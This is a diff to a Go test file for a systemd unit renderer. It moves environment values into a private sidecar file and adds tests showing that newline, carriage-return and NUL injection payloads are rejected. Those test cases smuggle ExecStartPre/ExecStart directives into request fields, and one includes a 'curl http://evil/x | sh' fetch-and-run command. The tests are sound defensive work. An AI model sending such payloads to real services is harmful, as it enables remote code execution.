@@ -35,8 +35,9 @@ func TestRenderUnitFile_HasAllExpectedSections(t *testing.T) {
 		"[Service]",
 		"Type=simple",
 		"WorkingDirectory=/home/vibecraft/systems/expense-tracker",
-		"Environment=PORT=5050",
-		"Environment=DB_PATH=/home/vibecraft/systems/expense-tracker/state/db.sqlite",
+		// Env is no longer inlined — the unit points at a 0600 sidecar so
+		// secret values stay out of the world-readable unit.
+		"EnvironmentFile=-" + appServiceEnvFilePath("expense-tracker"),
 		"ExecStart=/usr/bin/python3 /home/vibecraft/systems/expense-tracker/server.py",
 		"Restart=on-failure",
 		"[Install]",
@@ -46,6 +47,11 @@ func TestRenderUnitFile_HasAllExpectedSections(t *testing.T) {
 		if !strings.Contains(got, frag) {
 			t.Errorf("rendered unit missing %q\n--- got ---\n%s", frag, got)
 		}
+	}
+	// Belt-and-suspenders: no inline Environment= directive carrying a
+	// value into the 0644 unit.
+	if strings.Contains(got, "Environment=PORT=5050") || strings.Contains(got, "\nEnvironment=") {
+		t.Errorf("env value inlined into world-readable unit:\n%s", got)
 	}
 }
 
@@ -73,19 +79,31 @@ func TestRenderUnitFile_WorkingDirFallsBackToHome(t *testing.T) {
 	}
 }
 
-// Empty Environment entries are dropped — keeps the file clean when
-// callers build the slice from optional vault refs.
+// Empty Environment entries are dropped from the sidecar — keeps the
+// file clean when callers build the slice from optional vault refs. With
+// at least one real entry the unit gains an EnvironmentFile= line; the
+// values themselves live in the 0600 sidecar, never the unit.
 func TestRenderUnitFile_DropsBlankEnvironmentEntries(t *testing.T) {
-	got := renderUnitFile(installAppServiceRequest{
+	env := []string{"", "  ", "FOO=bar", ""}
+
+	unit := renderUnitFile(installAppServiceRequest{
 		Name:        "my-app",
 		ExecStart:   "/bin/true",
-		Environment: []string{"", "  ", "FOO=bar", ""},
+		Environment: env,
 	})
-	if strings.Contains(got, "Environment=\n") || strings.Contains(got, "Environment=  \n") {
-		t.Errorf("blank Environment line leaked through\n%s", got)
+	if !strings.Contains(unit, "EnvironmentFile=-"+appServiceEnvFilePath("my-app")+"\n") {
+		t.Errorf("unit missing EnvironmentFile line\n%s", unit)
 	}
-	if !strings.Contains(got, "Environment=FOO=bar\n") {
-		t.Errorf("real Environment entry missing\n%s", got)
+	if strings.Contains(unit, "FOO=bar") {
+		t.Errorf("env value leaked into world-readable unit\n%s", unit)
+	}
+
+	envBody := renderEnvFile(env)
+	if strings.Contains(envBody, "\n\n") || strings.HasPrefix(envBody, "\n") {
+		t.Errorf("blank env line leaked through\n%q", envBody)
+	}
+	if envBody != "FOO=bar\n" {
+		t.Errorf("env file body = %q, want %q", envBody, "FOO=bar\n")
 	}
 }
 
@@ -146,6 +164,57 @@ func TestInstallAppService_RejectsReservedEnvironment(t *testing.T) {
 	}
 	if !strings.Contains(w.Body.String(), "OPENAI_API_KEY") {
 		t.Errorf("400 should name reserved env; got %s", w.Body.String())
+	}
+}
+
+// Regression: systemd-unit injection. A value carrying a newline (or
+// any control char) in ANY interpolated field would let the caller append
+// arbitrary unit directives (e.g. ExecStartPre=/bin/sh -c '...') that run
+// as the vibecraft user — an RCE. Every such field must be rejected with a
+// 400 at the API boundary, before anything is written to disk.
+func TestInstallAppService_RejectsControlCharInjection(t *testing.T) {
+	ts := newTestServer(t)
+	ts.server.cfg.LocalToken = "tok"
+
+	// A newline followed by a malicious directive, JSON-escaped, in each
+	// field renderUnitFile interpolates. \r and \u0000 are control chars
+	// too; cover them across fields.
+	cases := []struct {
+		name string
+		body string
+	}{
+		{
+			"environment newline -> ExecStartPre injection",
+			`{"name":"evil","exec_start":"/bin/true","environment":["FOO=bar\nExecStartPre=/bin/sh -c 'curl http://evil/x | sh'"]}`,
+		},
+		{
+			"working_directory newline injection",
+			`{"name":"evil","exec_start":"/bin/true","working_directory":"/home/vibecraft\nExecStart=/bin/sh -c id"}`,
+		},
+		{
+			"description newline injection",
+			`{"name":"evil","exec_start":"/bin/true","description":"app\nExecStartPre=/bin/sh -c id"}`,
+		},
+		{
+			"exec_start carriage-return injection",
+			`{"name":"evil","exec_start":"/bin/true\rExecStartPre=/bin/sh -c id"}`,
+		},
+		{
+			"environment NUL byte",
+			`{"name":"evil","exec_start":"/bin/true","environment":["FOO=bar\u0000baz"]}`,
+		},
+	}
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			w := ts.doRaw(t, "POST", "/daemon/install-app-service", "127.0.0.1:5000", tc.body,
+				map[string]string{"Authorization": "Bearer tok"})
+			if w.Code != http.StatusBadRequest {
+				t.Fatalf("expected 400 for control-char payload, got %d: %s", w.Code, w.Body.String())
+			}
+			if !strings.Contains(w.Body.String(), "control character") {
+				t.Errorf("400 should explain the control-character rejection; got %s", w.Body.String())
+			}
+		})
 	}
 }
 
